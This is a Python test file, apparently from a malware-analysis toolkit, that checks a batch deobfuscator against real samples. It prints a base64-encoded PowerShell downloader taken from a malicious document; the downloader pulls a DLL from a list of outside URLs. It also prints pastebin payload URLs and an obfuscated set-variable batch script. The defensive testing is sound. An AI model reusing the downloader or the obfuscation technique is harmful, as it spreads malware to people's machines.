from .. import TestUnitBase

from inspect import getdoc


def multiline(obj):
    return getdoc(obj) or ''


class TestBAT(TestUnitBase):

    def test_maldoc_extracted_bat_loader(self):
        xlx = self.download_sample('9472b3a4b2394975087d9ce9ce5b855de21f9fb7f98f17f3a973b1fd11959705')
        xtr = self.ldu('xlxtr', 'B115', 'B116')
        bat = self.load()
        out = B'\n'.join(xlx | xtr) | bat | [str]
        self.assertIn(
            'start/B /WAIT powershell -enc JABqAGUAbwBsAGkAcwBlADMAUgBoAGcARABaAFMANABjAGQAZg'
            'BnAD0AIgBoAHQAdABwADoALwAvAGcAbwB5AGEAbAB1AGEAdAAuAHYAbQBlAHMAaAAuAGkAbgAvADAAdg'
            'A2AGsAYwBuAHkALwBDAEcALwAsAGgAdAB0AHAAcwA6AC8ALwBtAGEAcgBzAC4AcwByAGwALwB3AHAALQ'
            'BhAGQAbQBpAG4ALwA3AEYAZgBrADYATABMAE4AMgBYAHMAMgBXAC8ALABoAHQAdABwADoALwAvAGYAcg'
            'BhAG4AbQB1AGwAZQByAG8ALgBlAHMALwBtAGIAeAAvADgAYwA1AFIAQgBKAHgANgAvACwAaAB0AHQAcA'
            'A6AC8ALwB2AGEAcgBhAGYAbwBvAGQALgBjAG8AbQAvAEEAagBhAHgALwBjAG4ATQA5ADEARwAvACwAaA'
            'B0AHQAcABzADoALwAvADcAagBjAGEAdAAuAGMAbwBtAC8AdwBwAC0AYwBvAG4AdABlAG4AdAAvAHQALw'
            'AsAGgAdAB0AHAAOgAvAC8AYgBsAG8AZwAuAGMAZQBuAHQAcgBhAGwAaABvAG0AZQAuAGgAdQAvAHcAcA'
            'AtAGMAbwBuAHQAZQBuAHQALwBwAEIAMQBSAGYAUABDAG4AQgBsAFMAMQBXAGYAcABjAE8ATAAvACwAaA'
            'B0AHQAcAA6AC8ALwB6AGkAbQByAGkAZwBoAHQAcwAuAGMAbwAuAHoAdwAvAG8AbABkAHMAaQB0AGUALw'
            'BrADAARQBvAEMAVwB5AGMAVQA5AHQATgBvADEAZAAvACwAaAB0AHQAcABzADoALwAvAG0AdQBkAGgAYQ'
            'BuAGQAcwAuAGMAbwBtAC8AZQByAHIAbwByAC8AQgBmAEgALwAsAGgAdAB0AHAAOgAvAC8AYQBsAGIAYQ'
            'B0AHIAbwBzAHAAYQB0AGEAZwBvAG4AaQBhAC4AYwBvAG0ALwBwAGgAawBjAHYAdAAvAHQANQAzAGMAZQ'
            'BTAE0ARABxAGcAUABRAGwAcQAvACwAaAB0AHQAcAA6AC8ALwBtAGEAcABjAG8AbQBtAHUAbgBpAGMAYQ'
            'B0AGkAbwBuAHMALgBjAG8ALgB6AHcALwB3AHAALQBhAGQAbQBpAG4ALwBtAGQAUgBSAGIAUwBkAFUAMw'
            'BhAEIANwBYAHAAeAA2AHoALwAsAGgAdAB0AHAAOgAvAC8AbwBkAGMAbwBuAHMAdQBsAHQALgBjAG8ALg'
            'B1AGsALwBBAEwARgBBAF8ARABBAFQAQQAvAEgASAByADAARgBxAE8AWABBAG4ANgAyAC8ALABoAHQAdA'
            'BwADoALwAvAGQAdQBzAGgAawBpAG4ALgBuAGUAdAAvAGkAbQBnAC8AYgBoAFEAUwBUAE4AaQBjAEUATQ'
            'B0AE4AUQB4AFAALwAiAC4AcwBwAEwAaQBUACgAIgAsACIAKQA7AGYATwByAGUAYQBDAGgAKAAkAGoAZA'
            'B0AEYASgBkAFgAaAByADYAdAB4AHkAaABkACAAaQBuACAAJABqAGUAbwBsAGkAcwBlADMAUgBoAGcARA'
            'BaAFMANABjAGQAZgBnACkAewAkAHIAaAB5AGsAYQBqAGQAaABmAHMANwBpAGQAZgBnAGQAPQAiAGMAOg'
            'BcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAHYAYgBrAHcAawAuAGQAbABsACIAOwBpAE4AdgBPAGsAZQ'
            'AtAHcARQBiAHIAZQBRAHUAZQBzAFQAIAAtAHUAUgBpACAAJABqAGQAdABGAEoAZABYAGgAcgA2AHQAeA'
            'B5AGgAZAAgAC0AbwB1AFQAZgBpAEwAZQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZABmAGcAZA'
            'A7AGkAZgAoAHQAZQBzAHQALQBwAEEAdABIACAAJAByAGgAeQBrAGEAagBkAGgAZgBzADcAaQBkAGYAZw'
            'BkACkAewBpAGYAKAAoAGcAZQB0AC0AaQBUAGUAbQAgACQAcgBoAHkAawBhAGoAZABoAGYAcwA3AGkAZA'
            'BmAGcAZAApAC4ATABlAG4AZwB0AGgAIAAtAGcAZQAgADQANQAwADAAMAApAHsAYgByAGUAYQBrADsAfQ'
            'B9AH0A', out)

    def test_real_world_01(self):
        data = self.download_sample('6a1bc124f945ddfde62b4137d627f3958b23d8a2a6507e3841cab84416c54eea')
        deob = data | self.load() | str
        test = deob | self.ldu('xtp', 'url') | {str}
        self.assertSetEqual(test, {
            'https'R':'R'//pastebin'R'.'R'com/raw/bLnD8FWX',
            'https'R':'R'//pastebin'R'.'R'com/raw/EZ88t5c1',
        })

    def test_blog_post_example(self):
        @multiline
        class batch:
            '''
            set wjdk=set
            %wjdk% gwdoy= 
            %wjdk%%gwdoy%ipatx==
            %wjdk%%gwdoy%mqhofe%ipatx%es
            %wjdk%%gwdoy%dppmto%ipatx%*
            %wjdk%%gwdoy%qqou%ipatx%Da
            %wjdk%%gwdoy%jpsfhg%ipatx%i
            %wjdk%%gwdoy%ellpj%ipatx%1
            %wjdk%%gwdoy%mtbrob%ipatx%g
            %wjdk%%gwdoy%owmdn%ipatx%xe
            %wjdk%%gwdoy%xhpnnd%ipatx%R
            %wjdk%%gwdoy%lgqwon%ipatx%b4.
            %wjdk%%gwdoy%tqwnuq%ipatx%***
            %wjdk%%gwdoy%hhemc%ipatx%u
            %wjdk%%gwdoy%onqdwr%ipatx%60
            %wjdk%%gwdoy%xjbgb%ipatx%*
            %wjdk%%gwdoy%trpjq%ipatx%303
            %wjdk%%gwdoy%jwdub%ipatx%nt
            %wjdk%%gwdoy%papbet%ipatx%t
            %wjdk%%gwdoy%dmhljv%ipatx%min
            %wjdk%%gwdoy%lkjmj%ipatx%C:
            %wjdk%%gwdoy%hwagtv%ipatx%I
            %wjdk%%gwdoy%ximgny%ipatx%App
            %wjdk%%gwdoy%dblcjy%ipatx%***
            %wjdk%%gwdoy%hbjewj%ipatx%de
            %wjdk%%gwdoy%yatty%ipatx%b8
            %wjdk%%gwdoy%tbqci%ipatx%li
            %wjdk%%gwdoy%fbakxo%ipatx%**
            %wjdk%%gwdoy%drwc%ipatx%131
            %wjdk%%gwdoy%skmxb%ipatx%Use
            %wjdk%%gwdoy%wttahx%ipatx%st
            %wjdk%%gwdoy%nmdl%ipatx%5
            %wjdk%%gwdoy%rulr%ipatx%e
            %wjdk%%gwdoy%opflr%ipatx%o
            %wjdk%%gwdoy%blel%ipatx%ti
            %wjdk%%gwdoy%wbyt%ipatx%a
            %wjdk%%gwdoy%exiy%ipatx%r
            %wjdk%%gwdoy%yxbqxf%ipatx%s
            %wjdk%%gwdoy%ntqi%ipatx%\
            %wjdk%%gwdoy%jngoq%ipatx%ar
            %wttahx%%jngoq%%papbet%%gwdoy%%lkjmj%%ntqi%%skmxb%%exiy%%yxbqxf%%ntqi%%dppmto%%dblcjy%%xjbgb%%fbakxo%%tqwnuq%%ntqi%%ximgny%%qqou%%papbet%%wbyt%%ntqi%%xhpnnd%%opflr%%wbyt%%dmhljv%%mtbrob%%ntqi%%hwagtv%%hbjewj%%jwdub%%jpsfhg%%blel%%mqhofe%%ellpj%%onqdwr%%trpjq%%drwc%%nmdl%%ntqi%%hhemc%%tbqci%%yatty%%lgqwon%%rulr%%owmdn%
            '''
        test = batch | self.load() | str
        self.assertIn('Identities1603031315', test)
